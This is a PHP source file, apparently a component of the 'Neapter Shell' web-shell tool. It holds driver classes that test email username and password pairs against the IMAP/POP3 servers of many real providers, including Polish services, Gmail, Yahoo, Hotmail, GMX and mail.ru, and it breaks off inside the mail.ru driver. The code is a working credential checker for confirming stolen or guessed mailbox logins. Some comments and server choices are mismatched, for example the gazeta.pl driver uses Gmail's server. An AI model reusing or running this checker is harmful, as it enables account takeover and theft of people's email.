<?php

/**
 * Neapter Shell
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba
 *
 * @license   http://www.gnu.org/licenses/gpl-3.0.txt
 */

/**
 * Interface dla EmailValidator'a
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba
 *
 * @package    NeapterShell
 * @subpackage Tools\EmailValidator
 */
interface EmailValidatorInterface
{
    /**
     * Lista domen, ktorych dotyczy dana regula
     *
     * @access public
     * @return array  lista hostow
     */
    public function getHosts();

    /**
     * Sprawdzanie czy uzytkownik i haslo zgadzaja sie
     *
     * @access public
     * @param  string $sEmail Adres email
     * @param  string $sUsername Nazwa uzytkownika (to co jest przed znakiem '@')
     * @param  string $sPassword Haslo
     * @param  string $sDomain Nazwa domeny / hosta (to co jest za znakiem '@')
     * @return boolean            TRUE jezeli udalo sie zalogowac na skrzynke
     */
    public function isValid($sEmail, $sUsername, $sPassword, $sDomain);

}

/**
 * Obsluga o2.pl
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba
 *
 * @link      http://pomoc.o2.pl/poczta/programy/
 *
 * @package    NeapterShell
 * @subpackage Tools\EmailValidator\Drivers
 */
class EmailValidatorDriverO2pl implements EmailValidatorInterface
{
    /**
     * Lista domen, ktorych dotyczy dana regula
     *
     * @access public
     * @return array  lista hostow
     */
    public function getHosts()
    {
        return array
        (
            'o2.pl',
            'tlen.pl',
            'go2.pl',
            'prokonto.pl'
        );
    }

    /**
     * Sprawdzanie czy uzytkownik i haslo zgadzaja sie
     *
     * @access public
     * @param  string $sEmail Adres email
     * @param  string $sUsername Nazwa uzytkownika (to co jest przed znakiem '@')
     * @param  string $sPassword Haslo
     * @param  string $sDomain Nazwa domeny / hosta (to co jest za znakiem '@')
     * @return boolean            TRUE jezeli udalo sie zalogowac na skrzynke
     */
    public function isValid($sEmail, $sUsername, $sPassword, $sDomain)
    {
        /**
         * Dlugosc hasla w serwisie
         */
        if (!(strlen($sPassword) >= 5) && (strlen($sPassword) <= 15)) {
            return FALSE;
        }

        /**
         * Wlidacja
         */
        $rImap = @ imap_open(sprintf('{%s:993/imap/ssl/novalidate-cert}', EmailValidator::getHost('poczta.o2.pl')), $sUsername, $sPassword, OP_SILENT, 1);

        /**
         * Zamykanie polaczenia
         */
        if (is_resource($rImap)) {
            imap_close($rImap);

            return TRUE;
        }

        return FALSE;
    }

}

/**
 * Obsluga wp.pl
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba
 *
 * @link      http://poczta.wp.pl/info-pomoc-ustawienia.html?action=more&id=77
 * @link      http://poczta.wp.pl/info-pomoc-ustawienia.html?action=more&id=27
 *
 * @package    NeapterShell
 * @subpackage Tools\EmailValidator\Drivers
 */
class EmailValidatorDriverWppl implements EmailValidatorInterface
{
    /**
     * Lista domen, ktorych dotyczy dana regula
     *
     * @access public
     * @return array  lista hostow
     */
    public function getHosts()
    {
        return array
        (
            'wp.pl',
            'wp.eu'
        );
    }

    /**
     * Sprawdzanie czy uzytkownik i haslo zgadzaja sie
     *
     * @access public
     * @param  string $sEmail Adres email
     * @param  string $sUsername Nazwa uzytkownika (to co jest przed znakiem '@')
     * @param  string $sPassword Haslo
     * @param  string $sDomain Nazwa domeny / hosta (to co jest za znakiem '@')
     * @return boolean            TRUE jezeli udalo sie zalogowac na skrzynke
     */
    public function isValid($sEmail, $sUsername, $sPassword, $sDomain)
    {
        /**
         * Dlugosc hasla w serwisie
         */
        if (strlen($sPassword) < 6) {
            return FALSE;
        }

        /**
         * Wlidacja
         */
        $rImap = @ imap_open(sprintf('{%s:993/imap/ssl/novalidate-cert}', EmailValidator::getHost('imap.wp.pl')), $sUsername, $sPassword, OP_SILENT, 1);

        /**
         * Zamykanie polaczenia
         */
        if (is_resource($rImap)) {
            imap_close($rImap);

            return TRUE;
        }

        return FALSE;
    }

}

/**
 * Obsluga interia.pl
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba
 *
 * @link      http://info.poczta.interia.pl/pomoc/artykuly,1276750,parametry-do-konfiguracji-programow-pocztowych
 *
 * @package    NeapterShell
 * @subpackage Tools\EmailValidator\Drivers
 */
class EmailValidatorDriverInteriapl implements EmailValidatorInterface
{
    /**
     * Lista domen, ktorych dotyczy dana regula
     *
     * @access public
     * @return array  lista hostow
     */
    public function getHosts()
    {
        return array
        (
            'interia.pl',
            'interia.eu',
            'poczta.fm',

            /**
             * VIP
             */
            '1gb.pl',
            '2gb.pl',
            'vip.interia.pl',
            'akcja.pl',
            'serwus.pl',
            'czateria.pl'
        );
    }

    /**
     * Sprawdzanie czy uzytkownik i haslo zgadzaja sie
     *
     * @access public
     * @param  string $sEmail Adres email
     * @param  string $sUsername Nazwa uzytkownika (to co jest przed znakiem '@')
     * @param  string $sPassword Haslo
     * @param  string $sDomain Nazwa domeny / hosta (to co jest za znakiem '@')
     * @return boolean            TRUE jezeli udalo sie zalogowac na skrzynke
     */
    public function isValid($sEmail, $sUsername, $sPassword, $sDomain)
    {
        /**
         * Dlugosc hasla w serwisie
         */
        if ((strlen($sPassword) < 5) || ctype_lower($sPassword) || ctype_digit($sPassword)) {
            return FALSE;
        }

        switch ($sDomain) {
            case 'interia.pl':
            case 'interia.eu':
                $sHost = EmailValidator::getHost('poczta.interia.pl');

                if ($sDomain === 'interia.eu') {
                    $sUsername = $sEmail;
                }

                break;
            case 'poczta.fm':
                $sHost = EmailValidator::getHost('www.poczta.fm');
                break;
            default:
                $sHost = EmailValidator::getHost('poczta.vip.interia.pl');
                $sUsername = $sEmail;
        }
        /**
         * Wlidacja
         */
        $rImap = @ imap_open(sprintf('{%s:995/pop3/ssl/novalidate-cert}', $sHost), $sUsername, $sPassword, OP_SILENT, 1);

        /**
         * Zamykanie polaczenia
         */
        if (is_resource($rImap)) {
            imap_close($rImap);

            return TRUE;
        }

        return FALSE;
    }

}

/**
 * Obsluga onet.pl
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba
 *
 * @link      http://poczta.onet.pl/pomoc/13224,0,27,6,14020,37,0,0,pomoc.html
 * @link      http://poczta.onet.pl/oferta/opis_opcji.html
 *
 * @package    NeapterShell
 * @subpackage Tools\EmailValidator\Drivers
 */
class EmailValidatorDriverOnetpl implements EmailValidatorInterface
{
    /**
     * Lista domen, ktorych dotyczy dana regula
     *
     * @access public
     * @return array  lista hostow
     */
    public function getHosts()
    {
        return array
        (
            'onet.pl',
            'op.pl',
            'poczta.onet.pl',
            'onet.eu',
            'vp.pl',
            'poczta.onet.eu',
            'buziaczek.pl',
            'amorki.pl',
            'autograf.pl',

            'vip.onet.pl',
            'spoko.pl',
            'opoczta.pl',
            'onet.com.pl',

            /**
             * VIP
             */
            'adres.pl',
            'cyberia.pl',
            'pseudonim.pl'
        );
    }

    /**
     * Sprawdzanie czy uzytkownik i haslo zgadzaja sie
     *
     * @access public
     * @param  string $sEmail Adres email
     * @param  string $sUsername Nazwa uzytkownika (to co jest przed znakiem '@')
     * @param  string $sPassword Haslo
     * @param  string $sDomain Nazwa domeny / hosta (to co jest za znakiem '@')
     * @return boolean            TRUE jezeli udalo sie zalogowac na skrzynke
     */
    public function isValid($sEmail, $sUsername, $sPassword, $sDomain)
    {
        /**
         * Dlugosc hasla w serwisie
         *
         * Wymagana jest przynajmniej jedna cyfra
         */
        if (!((strlen($sPassword) >= 6) && preg_match('~\d~', $sPassword))) {
            return FALSE;
        }

        /**
         * Wlidacja
         */
        $rImap = @ imap_open(sprintf('{%s:993/imap/ssl/novalidate-cert}', EmailValidator::getHost('imap.poczta.onet.pl')), $sUsername, $sPassword, OP_SILENT, 1);

        /**
         * Zamykanie polaczenia
         */
        if (is_resource($rImap)) {
            imap_close($rImap);

            return TRUE;
        }

        return FALSE;
    }

}

/**
 * Obsluga onet.pl
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba
 *
 * @link      http://serwisy.gazeta.pl/Odnowa/0,87357,4782564.html#28
 *
 * @package    NeapterShell
 * @subpackage Tools\EmailValidator\Drivers
 */
class EmailValidatorDriverGazetapl implements EmailValidatorInterface
{
    /**
     * Lista domen, ktorych dotyczy dana regula
     *
     * @access public
     * @return array  lista hostow
     */
    public function getHosts()
    {
        return array('gazeta.pl');
    }

    /**
     * Sprawdzanie czy uzytkownik i haslo zgadzaja sie
     *
     * @access public
     * @param  string $sEmail Adres email
     * @param  string $sUsername Nazwa uzytkownika (to co jest przed znakiem '@')
     * @param  string $sPassword Haslo
     * @param  string $sDomain Nazwa domeny / hosta (to co jest za znakiem '@')
     * @return boolean            TRUE jezeli udalo sie zalogowac na skrzynke
     */
    public function isValid($sEmail, $sUsername, $sPassword, $sDomain)
    {
        /**
         * Serwis nie zezwala na wprowadzenie hasla takiego samego co login
         */
        if ($sUsername === $sPassword) {
            return FALSE;
        }

        /**
         * Dlugosc hasla w serwisie
         */
        if (!(strlen($sPassword) >= 8) && (strlen($sPassword) <= 25)) {
            return FALSE;
        }

        /**
         * Wlidacja
         */
        $rImap = @ imap_open(sprintf('{%s:995/pop3/ssl/novalidate-cert}', EmailValidator::getHost('pop.gmail.com')), $sUsername, $sPassword, OP_SILENT, 1);

        /**
         * Zamykanie polaczenia
         */
        if (is_resource($rImap)) {
            imap_close($rImap);

            return TRUE;
        }

        return FALSE;
    }

}

/**
 * Obsluga yahoo.com
 *
 * IMAP i POP3 nie sa dostepne w wersji FREE
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba
 *
 * @link      http://help.yahoo.com/l/pl/yahoo/mail/classic/mailplus/pop/pop-08.html
 *
 * @package    NeapterShell
 * @subpackage Tools\EmailValidator\Drivers
 */
class EmailValidatorDriverYahoocom implements EmailValidatorInterface
{
    /**
     * Lista domen, ktorych dotyczy dana regula
     *
     * @access public
     * @return array  lista hostow
     */
    public function getHosts()
    {
        return array
        (
            'yahoo.com',
            'yahoo.fr',
            'yahoo.pl',
            'yahoo.co.uk',
            'yahoo.com.cn',
            'ymail.com',
            'yahoo.ca',
            'yahoo.es',
            'rocketmail.com',
            'yahoo.com.au',
            'yahoo.de',
            'yahoo.com.br',
            'yahoo.it',
            'yahoo.com.tr',
            'yahoo.ie'
        );
    }

    /**
     * Sprawdzanie czy uzytkownik i haslo zgadzaja sie
     *
     * @access public
     * @param  string $sEmail Adres email
     * @param  string $sUsername Nazwa uzytkownika (to co jest przed znakiem '@')
     * @param  string $sPassword Haslo
     * @param  string $sDomain Nazwa domeny / hosta (to co jest za znakiem '@')
     * @return boolean            TRUE jezeli udalo sie zalogowac na skrzynke
     */
    public function isValid($sEmail, $sUsername, $sPassword, $sDomain)
    {
        /**
         * Serwis nie zezwala na wprowadzenie hasla takiego samego co login
         */
        if ($sUsername === $sPassword) {
            return FALSE;
        }

        /**
         * Dlugosc hasla w serwisie
         */
        if (!(strlen($sPassword) >= 5) && (strlen($sPassword) <= 32)) {
            return FALSE;
        }

        /**
         * Wlidacja
         */
        $rImap = @ imap_open(sprintf('{%s:993/imap/ssl/novalidate-cert}', EmailValidator::getHost('imap.mail.yahoo.com')), $sUsername, $sPassword, null, 1);

        /**
         * Zamykanie polaczenia
         */
        if (is_resource($rImap)) {
            imap_close($rImap);

            return TRUE;
        }

        return FALSE;
    }

}

/**
 * Obsluga yahoo.com
 *
 * Trzeba wlaczyc obsluge POP3 w panelu
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba
 *
 * @link      http://mail.google.com/support/bin/answer.py?answer=13287
 *
 * @package    NeapterShell
 * @subpackage Tools\EmailValidator\Drivers
 */
class EmailValidatorDriverGmailcom implements EmailValidatorInterface
{
    /**
     * Lista domen, ktorych dotyczy dana regula
     *
     * @access public
     * @return array  lista hostow
     */
    public function getHosts()
    {
        return array
        (
            'gmail.com',
            'googlemail.com'
        );
    }

    /**
     * Sprawdzanie czy uzytkownik i haslo zgadzaja sie
     *
     * @access public
     * @param  string $sEmail Adres email
     * @param  string $sUsername Nazwa uzytkownika (to co jest przed znakiem '@')
     * @param  string $sPassword Haslo
     * @param  string $sDomain Nazwa domeny / hosta (to co jest za znakiem '@')
     * @return boolean            TRUE jezeli udalo sie zalogowac na skrzynke
     */
    public function isValid($sEmail, $sUsername, $sPassword, $sDomain)
    {
        /**
         * Serwis nie zezwala na wprowadzenie hasla takiego samego co login
         */
        if ($sUsername === $sPassword) {
            return FALSE;
        }

        /**
         * Dlugosc hasla w serwisie
         */
        if (strlen($sPassword) < 8) {
            return FALSE;
        }

        /**
         * Wlidacja
         */
        $rImap = @ imap_open(sprintf('{%s:995/pop3/ssl/novalidate-cert}', EmailValidator::getHost('pop.gmail.com')), $sUsername, $sPassword, OP_SILENT, 1);

        /**
         * Zamykanie polaczenia
         */
        if (is_resource($rImap)) {
            imap_close($rImap);

            return TRUE;
        }

        return FALSE;
    }

}

/**
 * Obsluga Live.com
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba
 *
 * @link      http://www.mydigitallife.info/hotmail-free-pop3-and-smtp-access-and-server-configuration-settings/
 * @link      http://liveunplugged.wordpress.com/2010/03/12/hotmail-and-msn-accounts-pop3smtp-access/
 *
 * @package    NeapterShell
 * @subpackage Tools\EmailValidator\Drivers
 */
class EmailValidatorDriverLivecom implements EmailValidatorInterface
{
    /**
     * Lista domen, ktorych dotyczy dana regula
     *
     * @access public
     * @return array  lista hostow
     */
    public function getHosts()
    {
        return array
        (
            'hotmail.com',
            'hotmail.de',
            'hotmail.fr',
            'hotmail.it',
            'hotmail.co.jp',
            'hotmail.co.uk',
            'windowslive.com',
            'live.com',
            'live.de',
            'live.pl',
            'msn.com'
        );
    }

    /**
     * Sprawdzanie czy uzytkownik i haslo zgadzaja sie
     *
     * @access public
     * @param  string $sEmail Adres email
     * @param  string $sUsername Nazwa uzytkownika (to co jest przed znakiem '@')
     * @param  string $sPassword Haslo
     * @param  string $sDomain Nazwa domeny / hosta (to co jest za znakiem '@')
     * @return boolean            TRUE jezeli udalo sie zalogowac na skrzynke
     */
    public function isValid($sEmail, $sUsername, $sPassword, $sDomain)
    {
        /**
         * Serwis nie zezwala na wprowadzenie hasla takiego samego co login
         */
        if ($sUsername === $sPassword) {
            return FALSE;
        }

        /**
         * Dlugosc hasla w serwisie
         */
        if (strlen($sPassword) < 6) {
            return FALSE;
        }

        /**
         * Wlidacja
         */
        $rImap = @ imap_open(sprintf('{%s:995/pop3/ssl/novalidate-cert}', EmailValidator::getHost('pop3.live.com')), $sEmail, $sPassword, OP_SILENT, 5);

        /**
         * Zamykanie polaczenia
         */
        if (is_resource($rImap)) {
            imap_close($rImap);

            return TRUE;
        }

        return FALSE;
    }

}

/**
 * Obsluga neostrada.pl
 *
 * Brak informacji na temat dlugosci hasla
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba
 *
 * @link      http://konfiguracja.neostrada.pl/neo/help/konf_outlook.htm
 *
 * @package    NeapterShell
 * @subpackage Tools\EmailValidator\Drivers
 */
class EmailValidatorDriverNeostradapl implements EmailValidatorInterface
{
    /**
     * Lista domen, ktorych dotyczy dana regula
     *
     * @access public
     * @return array  lista hostow
     */
    public function getHosts()
    {
        return array('neostrada.pl');
    }

    /**
     * Sprawdzanie czy uzytkownik i haslo zgadzaja sie
     *
     * @access public
     * @param  string $sEmail Adres email
     * @param  string $sUsername Nazwa uzytkownika (to co jest przed znakiem '@')
     * @param  string $sPassword Haslo
     * @param  string $sDomain Nazwa domeny / hosta (to co jest za znakiem '@')
     * @return boolean            TRUE jezeli udalo sie zalogowac na skrzynke
     */
    public function isValid($sEmail, $sUsername, $sPassword, $sDomain)
    {
        /**
         * Serwis nie zezwala na wprowadzenie hasla takiego samego co login
         */
        if ($sUsername === $sPassword) {
            return FALSE;
        }

        /**
         * Wlidacja
         */
        $rImap = @ imap_open(sprintf('{%s:995/pop3/ssl/novalidate-cert}', EmailValidator::getHost('poczta.neostrada.pl')), $sEmail, $sPassword, OP_SILENT, 1);

        /**
         * Zamykanie polaczenia
         */
        if (is_resource($rImap)) {
            imap_close($rImap);

            return TRUE;
        }

        return FALSE;
    }

}

/**
 * Obsluga orangep.pl
 *
 * Brak informacji na temat dlugosci hasla
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba
 *
 * @link      http://ustaw.orange.pl/ust.aspx
 *
 * @package    NeapterShell
 * @subpackage Tools\EmailValidator\Drivers
 */
class EmailValidatorDriverOrangepl implements EmailValidatorInterface
{
    /**
     * Lista domen, ktorych dotyczy dana regula
     *
     * @access public
     * @return array  lista hostow
     */
    public function getHosts()
    {
        return array('orange.pl');
    }

    /**
     * Sprawdzanie czy uzytkownik i haslo zgadzaja sie
     *
     * @access public
     * @param  string $sEmail Adres email
     * @param  string $sUsername Nazwa uzytkownika (to co jest przed znakiem '@')
     * @param  string $sPassword Haslo
     * @param  string $sDomain Nazwa domeny / hosta (to co jest za znakiem '@')
     * @return boolean            TRUE jezeli udalo sie zalogowac na skrzynke
     */
    public function isValid($sEmail, $sUsername, $sPassword, $sDomain)
    {
        /**
         * Serwis nie zezwala na wprowadzenie hasla takiego samego co login
         */
        if ($sUsername === $sPassword) {
            return FALSE;
        }

        /**
         * Wlidacja
         */
        $rImap = imap_open(sprintf('{%s:995/pop3/ssl/novalidate-cert}', EmailValidator::getHost('mail.orange.pl')), $sUsername, $sPassword, OP_SILENT, 1);

        /**
         * Zamykanie polaczenia
         */
        if (is_resource($rImap)) {
            imap_close($rImap);

            return TRUE;
        }

        return FALSE;
    }

}

/**
 * Obsluga poczta.pl
 *
 * Brak informacji na temat dlugosci hasla
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba
 *
 * @link      http://www.poczta.pl
 *
 * @package    NeapterShell
 * @subpackage Tools\EmailValidator\Drivers
 */
class EmailValidatorDriverPocztapl implements EmailValidatorInterface
{
    /**
     * Lista domen, ktorych dotyczy dana regula
     *
     * @access public
     * @return array  lista hostow
     */
    public function getHosts()
    {
        return array('poczta.pl');
    }

    /**
     * Sprawdzanie czy uzytkownik i haslo zgadzaja sie
     *
     * @access public
     * @param  string $sEmail Adres email
     * @param  string $sUsername Nazwa uzytkownika (to co jest przed znakiem '@')
     * @param  string $sPassword Haslo
     * @param  string $sDomain Nazwa domeny / hosta (to co jest za znakiem '@')
     * @return boolean            TRUE jezeli udalo sie zalogowac na skrzynke
     */
    public function isValid($sEmail, $sUsername, $sPassword, $sDomain)
    {
        /**
         * Serwis nie zezwala na wprowadzenie hasla takiego samego co login
         */
        if ($sUsername === $sPassword) {
            return FALSE;
        }

        /**
         * Wlidacja
         */
        $rImap = @ imap_open(sprintf('{%s:993/imap/ssl/novalidate-cert}', EmailValidator::getHost('mail.poczta.pl')), $sEmail, $sPassword, OP_SILENT, 1);

        /**
         * Zamykanie polaczenia
         */
        if (is_resource($rImap)) {
            imap_close($rImap);

            return TRUE;
        }

        return FALSE;
    }

}

/**
 * Obsluga plusnet.pl
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba
 *
 * @link      https://www.plusnet.pl/pomoc.html
 *
 * @package    NeapterShell
 * @subpackage Tools\EmailValidator\Drivers
 */
class EmailValidatorDriverPlusnetpl implements EmailValidatorInterface
{
    /**
     * Lista domen, ktorych dotyczy dana regula
     *
     * @access public
     * @return array  lista hostow
     */
    public function getHosts()
    {
        return array('plusnet.pl');
    }

    /**
     * Sprawdzanie czy uzytkownik i haslo zgadzaja sie
     *
     * @access public
     * @param  string $sEmail Adres email
     * @param  string $sUsername Nazwa uzytkownika (to co jest przed znakiem '@')
     * @param  string $sPassword Haslo
     * @param  string $sDomain Nazwa domeny / hosta (to co jest za znakiem '@')
     * @return boolean            TRUE jezeli udalo sie zalogowac na skrzynke
     */
    public function isValid($sEmail, $sUsername, $sPassword, $sDomain)
    {
        /**
         * Serwis nie zezwala na wprowadzenie hasla takiego samego co login
         */
        if ($sUsername === $sPassword) {
            return FALSE;
        }

        /**
         * Dlugosc hasla w serwisie
         */
        if (strlen($sPassword) < 6) {
            return FALSE;
        }

        /**
         * Wlidacja
         */
        $rImap = @ imap_open(sprintf('{%s:993/imap/ssl/novalidate-cert}', EmailValidator::getHost('mail.plusnet.pl')), $sUsername, $sPassword, OP_SILENT, 1);

        /**
         * Zamykanie polaczenia
         */
        if (is_resource($rImap)) {
            imap_close($rImap);

            return TRUE;
        }

        return FALSE;
    }

}

/**
 * Obsluga web.de
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba
 *
 * @link      https://registrierung.web.de/
 * @link      https://hilfe.web.de/e-mail/pop3.html
 *
 * @package    NeapterShell
 * @subpackage Tools\EmailValidator\Drivers
 */
class EmailValidatorDriverWebde implements EmailValidatorInterface
{
    /**
     * Lista domen, ktorych dotyczy dana regula
     *
     * @access public
     * @return array  lista hostow
     */
    public function getHosts()
    {
        return array
        (
            'web.de'
        );
    }

    /**
     * Sprawdzanie czy uzytkownik i haslo zgadzaja sie
     *
     * @access public
     * @param  string $sEmail Adres email
     * @param  string $sUsername Nazwa uzytkownika (to co jest przed znakiem '@')
     * @param  string $sPassword Haslo
     * @param  string $sDomain Nazwa domeny / hosta (to co jest za znakiem '@')
     * @return boolean            TRUE jezeli udalo sie zalogowac na skrzynke
     */
    public function isValid($sEmail, $sUsername, $sPassword, $sDomain)
    {
        /**
         * Dlugosc hasla w serwisie
         */
        if (!(strlen($sPassword) >= 8) && (strlen($sPassword) <= 40)) {
            return FALSE;
        }

        /**
         * Wlidacja
         */
        $rImap = @ imap_open(sprintf('{%s:995/pop3/ssl/novalidate-cert}', EmailValidator::getHost('pop3.web.de')), $sEmail, $sPassword, OP_SILENT, 1);

        /**
         * Zamykanie polaczenia
         */
        if (is_resource($rImap)) {
            imap_close($rImap);

            return TRUE;
        }

        return FALSE;
    }

}

/**
 * Obsluga gmx.de
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba
 *
 * @link      https://registrierung.web.de/
 * @link      http://help.gmx.com/mail/overview/pop3/thunderbird3/
 *
 * @package    NeapterShell
 * @subpackage Tools\EmailValidator\Drivers
 */
class EmailValidatorDriverGmxde implements EmailValidatorInterface
{
    /**
     * Lista domen, ktorych dotyczy dana regula
     *
     * @access public
     * @return array  lista hostow
     */
    public function getHosts()
    {
        return array
        (
            'gmx.de',
            'gmx.at',
            'gmx.ch',
            'gmx.net'
        );
    }

    /**
     * Sprawdzanie czy uzytkownik i haslo zgadzaja sie
     *
     * @access public
     * @param  string $sEmail Adres email
     * @param  string $sUsername Nazwa uzytkownika (to co jest przed znakiem '@')
     * @param  string $sPassword Haslo
     * @param  string $sDomain Nazwa domeny / hosta (to co jest za znakiem '@')
     * @return boolean            TRUE jezeli udalo sie zalogowac na skrzynke
     */
    public function isValid($sEmail, $sUsername, $sPassword, $sDomain)
    {
        /**
         * Dlugosc hasla w serwisie
         */
        if (strlen($sPassword) < 6) {
            return FALSE;
        }

        /**
         * Wlidacja
         */
        $rImap = @ imap_open(sprintf('{%s:995/pop3/ssl/novalidate-cert}', EmailValidator::getHost('pop.gmx.com')), $sEmail, $sPassword, OP_SILENT, 1);

        /**
         * Zamykanie polaczenia
         */
        if (is_resource($rImap)) {
            imap_close($rImap);

            return TRUE;
        }

        return FALSE;
    }

}

/**
 * Obsluga pino.pl
 *
 * @todo      untested
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba
 *
 * @link      http://openid.pino.pl/app/konto-rejestracja
 * @link      http://www.pino.pl/faq/informacje-ogolne-61
 *
 * @package    NeapterShell
 * @subpackage Tools\EmailValidator\Drivers
 */
class EmailValidatorDriverPinopl implements EmailValidatorInterface
{
    /**
     * Lista domen, ktorych dotyczy dana regula
     *
     * @access public
     * @return array  lista hostow
     */
    public function getHosts()
    {
        return array
        (
            'pino.pl'
        );
    }

    /**
     * Sprawdzanie czy uzytkownik i haslo zgadzaja sie
     *
     * @access public
     * @param  string $sEmail Adres email
     * @param  string $sUsername Nazwa uzytkownika (to co jest przed znakiem '@')
     * @param  string $sPassword Haslo
     * @param  string $sDomain Nazwa domeny / hosta (to co jest za znakiem '@')
     * @return boolean            TRUE jezeli udalo sie zalogowac na skrzynke
     */
    public function isValid($sEmail, $sUsername, $sPassword, $sDomain)
    {
        /**
         * Dlugosc loginu w serwisie
         */
        if (!(strlen($sUsername) >= 3) && (strlen($sUsername) <= 32)) {
            return FALSE;
        }

        /**
         * Dlugosc hasla w serwisie
         */
        if (!(strlen($sPassword) >= 4) && (strlen($sPassword) <= 20)) {
            return FALSE;
        }

        /**
         * Wlidacja
         */
        $rImap = @ imap_open(sprintf('{%s:995/pop3/ssl/novalidate-cert}', EmailValidator::getHost('pop3.pino.pl')), $sEmail, $sPassword, OP_SILENT, 1);

        /**
         * Zamykanie polaczenia
         */
        if (is_resource($rImap)) {
            imap_close($rImap);

            return TRUE;
        }

        return FALSE;
    }

}

/**
 * Obsluga inmail.pl
 *
 * @todo      untested
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba
 *
 * @link      http://www2.inmail.pl/ClientOE.aspx
 *
 * @package    NeapterShell
 * @subpackage Tools\EmailValidator\Drivers
 */
class EmailValidatorDriverInmailpl implements EmailValidatorInterface
{
    /**
     * Lista domen, ktorych dotyczy dana regula
     *
     * @access public
     * @return array  lista hostow
     */
    public function getHosts()
    {
        return array
        (
            'inmail.pl'
        );
    }

    /**
     * Sprawdzanie czy uzytkownik i haslo zgadzaja sie
     *
     * @access public
     * @param  string $sEmail Adres email
     * @param  string $sUsername Nazwa uzytkownika (to co jest przed znakiem '@')
     * @param  string $sPassword Haslo
     * @param  string $sDomain Nazwa domeny / hosta (to co jest za znakiem '@')
     * @return boolean            TRUE jezeli udalo sie zalogowac na skrzynke
     */
    public function isValid($sEmail, $sUsername, $sPassword, $sDomain)
    {
        /**
         * Dlugosc loginu w serwisie
         */
        if (!(strlen($sUsername) >= 3) && (strlen($sUsername) <= 30)) {
            return FALSE;
        }

        /**
         * Dlugosc hasla w serwisie
         */
        if (!(strlen($sPassword) >= 4) && (strlen($sPassword) <= 30)) {
            return FALSE;
        }

        /**
         * Wlidacja
         */
        $rImap = @ imap_open(sprintf('{%s:995/pop3/ssl/novalidate-cert}', EmailValidator::getHost('pop3.inmail.pl')), $sEmail, $sPassword, OP_SILENT, 1);

        /**
         * Zamykanie polaczenia
         */
        if (is_resource($rImap)) {
            imap_close($rImap);

            return TRUE;
        }

        return FALSE;
    }

}

/**
 * Obsluga gg.pl
 *
 * @todo      untested
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba
 *
 * @link      http://www.gg.pl/info/rejestracja-aktualizacja-danych
 * @link      http://poczta.gg.pl/lekcja/2
 *
 * @package    NeapterShell
 * @subpackage Tools\EmailValidator\Drivers
 */
class EmailValidatorDriverGgpl implements EmailValidatorInterface
{
    /**
     * Lista domen, ktorych dotyczy dana regula
     *
     * @access public
     * @return array  lista hostow
     */
    public function getHosts()
    {
        return array
        (
            'gg.pl'
        );
    }

    /**
     * Sprawdzanie czy uzytkownik i haslo zgadzaja sie
     *
     * @access public
     * @param  string $sEmail Adres email
     * @param  string $sUsername Nazwa uzytkownika (to co jest przed znakiem '@')
     * @param  string $sPassword Haslo
     * @param  string $sDomain Nazwa domeny / hosta (to co jest za znakiem '@')
     * @return boolean            TRUE jezeli udalo sie zalogowac na skrzynke
     */
    public function isValid($sEmail, $sUsername, $sPassword, $sDomain)
    {
        /**
         * Dlugosc hasla w serwisie
         */
        if (strlen($sPassword) < 6) {
            return FALSE;
        }

        /**
         * Wlidacja
         */
        $rImap = @ imap_open(sprintf('{%s:993/imap/ssl/novalidate-cert}', EmailValidator::getHost('imap.gg.pl')), $sEmail, $sPassword, OP_SILENT, 1);

        /**
         * Zamykanie polaczenia
         */
        if (is_resource($rImap)) {
            imap_close($rImap);

            return TRUE;
        }

        return FALSE;
    }

}

/**
 * Obsluga mail.ru
 *
 * @todo      untested
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba
 *
 * @link      http://help.mail.ru/mail-help/mailer/popsmtp
 *
 * @package    NeapterShell
 * @subpackage Tools\EmailValidator\Drivers
 */
class EmailValidatorDriverMailru implements EmailValidatorInterface
{
    /**
     * Lista domen, ktorych dotyczy dana regula
     *
     * @access public
     * @return array  lista hostow
     */
    public function getHosts()
    {
        return array
        (
            'mail.ru',
            'inbox.ru',
            'list.ru',
            'bk.ru'
        );
    }

    /**
     * Sprawdzanie czy uzytkownik i haslo zgadzaja sie
     *
     * @access public
     * @param  string $sEmail Adres email
     * @param  string $sUsername Nazwa uzytkownika (to co jest przed znakiem '@')
     * @param  string $sPassword Haslo
     * @param  string $sDomain Nazwa domeny / hosta (to co jest za znakiem '@')
     * @return boolean            TRUE jezeli udalo sie zalogowac na skrzynke
     */
